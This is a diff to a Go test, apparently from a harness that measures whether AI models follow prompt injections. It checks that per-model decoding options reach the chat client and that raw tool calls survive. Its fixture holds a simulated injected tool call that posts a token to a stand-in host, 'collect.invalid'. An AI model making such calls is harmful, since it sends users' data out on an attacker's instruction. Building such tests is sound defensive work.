@@ -127,11 +127,15 @@ func TestRunOneInjectionWiresRawCalls(t *testing.T) {
 		RawToolCalls: []injectionRawCall{{ID: "x", Name: "mcp__web__http_post",
 			Arguments: "{\"url\":\"https://collect.invalid\",\"body\":\"" + tm + "\"}", ArgumentsPresent: true, DecodeOK: true}},
 	}}
-	r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute}
+	r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute,
+		InjectionDecoding: map[string]provider.ModelOptions{"m": {NumPredict: 77}}}
 	res := r.runOne(context.Background(), candidateTransport{chat: c, providerName: "openai-compat"},
 		ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}, validInjectionTrace())
 	if res.Err != nil {
 		t.Fatalf("err: %v", res.Err)
+	}
+	if c.got.ProviderOptions == nil || c.got.ProviderOptions.NumPredict != 77 {
+		t.Fatalf("registered decoding not handed to the chat client: %+v", c.got.ProviderOptions)
 	}
 	if len(res.RawToolCalls) != 1 || res.RawToolCalls[0].ID != "x" {
 		t.Fatalf("returned Result lost the raw channel: %+v", res.RawToolCalls)
